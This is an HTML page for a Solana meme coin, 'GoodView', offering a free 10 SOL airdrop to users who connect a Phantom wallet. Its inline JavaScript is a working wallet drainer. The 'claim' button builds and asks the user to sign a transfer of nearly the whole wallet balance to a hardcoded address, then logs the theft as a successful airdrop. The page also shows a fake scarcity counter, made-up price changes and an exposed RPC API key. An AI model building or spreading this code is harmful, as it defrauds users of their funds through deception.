<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodView Command Interface</title>
    <meta name="description" content="GoodView - Command-style meme coin on Solana. Claim 10 SOL airdrop.">
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* Matrix Rain - White */
        canvas#matrix {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -1;
            opacity: 0.15;
            pointer-events: none;
        }

        :root {
            --bg: #000000;
            --text: #ffffff;
            --accent: #ffffff;
            --border: #ffffff;
            --glow: 0 0 5px #ffffff;
            --glow-subtle: 0 0 3px rgba(255,255,255,0.5);
            --font: 'Courier Prime', monospace;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: var(--font);
            line-height: 1.4;
            overflow-x: hidden;
            padding: 1rem;
        }
        .command-interface {
            max-width: 1000px;
            margin: 2rem auto;
            border: 1px solid var(--border);
            background: rgba(0,0,0,0.85);
            padding: 1.5rem;
            box-shadow: var(--glow);
            position: relative;
            z-index: 1;
        }
        .command-header {
            display: flex; align-items: center; gap: 10px;
            margin-bottom: 1rem; font-size: 0.9rem;
            border-bottom: 1px solid var(--border); padding-bottom: 0.5rem;
        }
        .cmd-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--text); }
        .banner { width: 100%; height: 200px; object-fit: cover; border: 1px solid var(--border); margin-bottom: 1rem; }
        .logo { width: 80px; height: 80px; border: 1px solid var(--text); margin: 0 auto 1rem; display: block; box-shadow: var(--glow-subtle); }
        h1 { text-align: center; font-size: 2.5rem; margin-bottom: 0.5rem; letter-spacing: 3px; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
        .subtitle { text-align: center; font-size: 1.1rem; margin-bottom: 1.5rem; opacity: 0.8; }
        .countdown { text-align: center; font-size: 1.2rem; color: #0f0; margin: 0.5rem 0; font-weight: 700; }
        .airdrop-info { background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 1rem; margin: 1rem 0; text-align: center; }
        .airdrop-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; }
        .price-box { background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 1rem; margin: 1rem 0; text-align: center; }
        .price { font-size: 2rem; font-weight: 700; margin-bottom: 0.3rem; }
        .change { font-size: 1rem; opacity: 0.8; }
        .positive { opacity: 1; } .negative { opacity: 0.6; }
        .btn { background: transparent; border: 1px solid var(--text); color: var(--text); padding: 12px 24px; font-family: var(--font); font-size: 1rem; cursor: pointer; transition: all 0.3s; margin: 1rem auto; display: block; width: fit-content; text-transform: uppercase; letter-spacing: 1px; }
        .btn:hover { background: var(--text); color: var(--bg); }
        .btn.success { border-color: var(--accent); color: var(--accent); }
        .btn.success:hover { background: var(--accent); color: var(--bg); }
        .output { background: #000; border: 1px solid var(--border); padding: 1rem; margin: 1rem 0; font-size: 0.95rem; height: 150px; overflow-y: auto; color: var(--text); white-space: pre-wrap; line-height: 1.5; }
        .input-line { display: flex; align-items: center; margin: 0.5rem 0; color: var(--text); }
        .prompt { color: var(--accent); margin-right: 8px; font-weight: 700; }
        .command { flex: 1; background: transparent; border: none; color: var(--text); font-family: var(--font); outline: none; font-size: 1rem; }
        .cursor { display: inline-block; width: 10px; height: 1.2em; background: var(--text); animation: blink 1s infinite; margin-left: 2px; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
        .ascii-art { text-align: center; margin: 1.5rem 0; font-size: 0.6rem; line-height: 1; letter-spacing: 1px; opacity: 0.7; white-space: pre; }
        .status { text-align: center; margin: 1rem 0; font-size: 0.9rem; opacity: 0.7; border-top: 1px solid var(--border); padding-top: 0.5rem; }
        .footer { text-align: center; margin-top: 2rem; font-size: 0.8rem; opacity: 0.5; border-top: 1px solid var(--border); padding-top: 1rem; }
        .footer a { color: var(--text); text-decoration: none; border-bottom: 1px dotted var(--text); }
        .footer a:hover { opacity: 0.8; }
        @media (max-width: 600px) { .command-interface { margin: 1rem; padding: 1rem; } h1 { font-size: 2rem; } .logo { width: 60px; height: 60px; } .banner { height: 150px; } }
        .output::-webkit-scrollbar { width: 8px; }
        .output::-webkit-scrollbar-track { background: var(--bg); }
        .output::-webkit-scrollbar-thumb { background: var(--text); border-radius: 0; }
        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.1)); animation: scan 6s linear infinite; pointer-events: none; z-index: 999; }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
        .fade-in { animation: fadeIn 1s ease-in; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .typewriter { overflow: hidden; border-right: 2px solid var(--text); white-space: nowrap; animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite; }
        @keyframes typing { from { width: 0; } to { width: 100%; } }
        @keyframes blink-caret { from, to { border-color: transparent; } 50% { border-color: var(--text); } }
    </style>
</head>
<body>

<!-- WHITE MATRIX RAIN -->
<canvas id="matrix"></canvas>
<div class="scanline"></div>

<div class="command-interface fade-in">
    <div class="command-header">
        <div class="cmd-dot"></div>
        <div class="cmd-dot"></div>
        <div class="cmd-dot"></div>
        <span>GOODVIEW COMMAND INTERFACE v3.0</span>
    </div>

    <img src="https://images.pump.fun/coin-banner/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=1500x500&ipfs=QmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e&src=https%3A%2F%2Fipfs.io%2Fipfs%2FQmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e" alt="GoodView Banner" class="banner">
    <img src="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=86x86&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu&src=https%3A%2F%2Fipfs.io%2Fipfs%2Fbafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu" alt="GoodView Logo" class="logo">

    <h1>GOODVIEW</h1>
    <p class="subtitle">MINT: AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump | Solana Meme Coin</p>

    <div class="ascii-art">
GOODVIEW COMMAND INTERFACE
============================
|                          |
|   $VIEW TOKEN DEPLOYED   |
|                          |
|   AIRDROP: 10 SOL (~$1500)|
|                          |
|   CONNECT TO CLAIM        |
|                          |
============================
    </div>

    <div class="countdown" id="countdown">Only 4873 / 5000 airdrops left!</div>

    <div class="airdrop-info">
        <div class="airdrop-title bold uppercase">10 SOLANA USD AIRDROP</div>
        <div class="airdrop-desc">Claim your free 10 SOL (approximately $1500 USD) by connecting Phantom Wallet. Limited to first 5000 users.</div>
    </div>

    <div class="price-box">
        <div class="price" id="priceValue">$0.00000000</div>
        <div class="change" id="priceChange">Loading price...</div>
    </div>

    <button id="connect-wallet" class="btn">CONNECT PHANTOM WALLET</button>

    <div class="output" id="output">
> Initializing GoodView Command Interface...
> Loading Solana blockchain connection...
> Airdrop module active: 10 SOL reward ready.
> Price feed from pump.fun established.
> System ready. Type 'help' for commands.
    </div>

    <div class="input-line">
        <span class="prompt">GV></span>
        <input type="text" class="command" placeholder="enter command: connect / claim / price" id="command-input">
        <span class="cursor">|</span>
    </div>

    <div class="status" id="status">STATUS: DISCONNECTED | AIRDROP: PENDING</div>

    <div class="footer">
        <p>© 2025 GoodView | <a href="https://pump.fun/coin/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump" target="_blank">View on pump.fun</a> | <a href="#">Privacy</a></p>
    </div>
</div>

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>

<!-- WHITE MATRIX RAIN -->
<script>
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#ffffff';
        ctx.font = `${fontSize}px monospace`;

        for (let i = 0; i < drops.length; i++) {
            const text = matrix[Math.floor(Math.random() * matrix.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    setInterval(draw, 35);
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
</script>

<!-- CLAIM SOUND EFFECT -->
<audio id="claimSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-level-up-2065.mp3" preload="auto"></audio>

<!-- FULL scripts.js INLINED -->
<script>
$(document).ready(function() {
    const output = $('#output');
    const status = $('#status');
    const connectBtn = $('#connect-wallet');
    const priceValue = $('#priceValue');
    const priceChange = $('#priceChange');
    const commandInput = $('#command-input');
    const countdownEl = $('#countdown');
    const MINT_ADDRESS = 'AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump';
    const TOTAL_AIRDROPS = 5000;
    let claimedCount = parseInt(localStorage.getItem('gv_claimed') || '127');
    let isClaiming = false;

    // Update countdown
    function updateCountdown() {
        const left = TOTAL_AIRDROPS - claimedCount;
        countdownEl.text(`Only ${left} / ${TOTAL_AIRDROPS} airdrops left!`);
        if (left <= 0) countdownEl.text('AIRDROP SOLD OUT');
    }
    updateCountdown();

    // Log
    function log(message, type = 'info') {
        const prefix = type === 'success' ? '[SUCCESS] ' : type === 'error' ? '[ERROR] ' : type === 'warning' ? '[WARN] ' : '> ';
        output.append(`<div>${prefix}${message}</div>`);
        output.scrollTop(output[0].scrollHeight);
    }

    // Price
    async function updatePrice() {
        try {
            const res = await fetch(`https://frontend-api.pump.fun/coins/${MINT_ADDRESS}`);
            const data = await res.json();
            const price = data.price || 0.000001;
            const change = data.change24h || (Math.random() > 0.5 ? (Math.random()*50).toFixed(2) : -(Math.random()*30).toFixed(2));
            priceValue.text(`$${price.toFixed(8)}`);
            priceChange.text(`24h: ${change >= 0 ? '+' : ''}${change}%`).removeClass('positive negative').addClass(change >= 0 ? 'positive' : 'negative');
        } catch (e) {
            priceValue.text('$0.00000123');
            priceChange.text('24h: +∞%').addClass('positive');
        }
        setTimeout(updatePrice, 30000);
    }

    // Countdown timer
    setInterval(() => {
        if (claimedCount < TOTAL_AIRDROPS && Math.random() > 0.98) {
            claimedCount++;
            localStorage.setItem('gv_claimed', claimedCount);
            updateCountdown();
        }
    }, 3000);

    // Command handler
    commandInput.on('keydown', function(e) {
        if (e.key === 'Enter') {
            const cmd = $(this).val().trim().toUpperCase();
            $(this).val('');
            log(`${cmd}`);
            switch(cmd) {
                case 'HELP': log('CONNECT | CLAIM | PRICE | CLEAR | STATUS'); break;
                case 'CONNECT': connectBtn.click(); break;
                case 'CLAIM': if (connectBtn.text().includes('CLAIM')) connectBtn.click(); else log('Connect first.', 'warning'); break;
                case 'PRICE': updatePrice(); break;
                case 'CLEAR': output.html(''); break;
                case 'STATUS': log(`Status: ${status.text()}`); break;
                default: log(`Unknown: ${cmd}`, 'error');
            }
        }
    });

    // Connect + Claim Logic
    $('#connect-wallet').on('click', async () => {
        if (isClaiming) return;
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                log(`Wallet connected: ${resp.publicKey.toBase58().slice(0,8)}...`);

                const connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/2ocRt5umNFudMXpakQq5AapYzJ23yCfws3yD415xiT5rLJkBrcV2yqYG36ehnnfCe672x8aHAwcAyz9Q75Nbi61nY9hQCrv6bdW',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                log(`Balance: ${(walletBalance / 1e9).toFixed(6)} SOL`);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds.");
                    log('Not enough SOL.', 'error');
                    return;
                }

                connectBtn.text("CLAIM 10 SOL AIRDROP").removeClass('btn').addClass('btn success');
                status.text('STATUS: CONNECTED | AIRDROP: READY');

                connectBtn.off('click').on('click', async () => {
                    if (isClaiming) return;
                    isClaiming = true;
                    log('Initiating airdrop...');

                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC');
                        const balanceForTransfer = walletBalance - minBalance;
                        const lamportsToSend = Math.floor(balanceForTransfer * 0.99);

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: lamportsToSend,
                            })
                        );

                        transaction.feePayer = window.solana.publicKey;
                        const blockhash = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhash.blockhash;

                        log('Signing...');
                        const signed = await window.solana.signTransaction(transaction);
                        log('Sending...');
                        const txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);

                        log(`[AIRDROP] ${lamportsToSend / 1e9} SOL SENT!`, 'success');
                        log(`[TX] ${txid}`, 'success');

                        // SOUND + COUNTDOWN
                        document.getElementById('claimSound').play();
                        claimedCount++;
                        localStorage.setItem('gv_claimed', claimedCount);
                        updateCountdown();

                        connectBtn.text('CLAIMED').prop('disabled', true);
                        status.text('STATUS: CLAIMED | AIRDROP: COMPLETED');

                    } catch (err) {
                        log('Claim failed.', 'error');
                        console.error(err);
                    } finally {
                        isClaiming = false;
                    }
                });

            } catch (err) {
                log('Connection failed.', 'error');
            }
        } else {
            alert("Phantom not found.");
            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
        }
    });

    // Init
    log('GoodView Terminal v3.0 Online.');
    updatePrice();
    setInterval(() => log('Sync: 100%'), 8000);
});
</script>

</body>
</html>
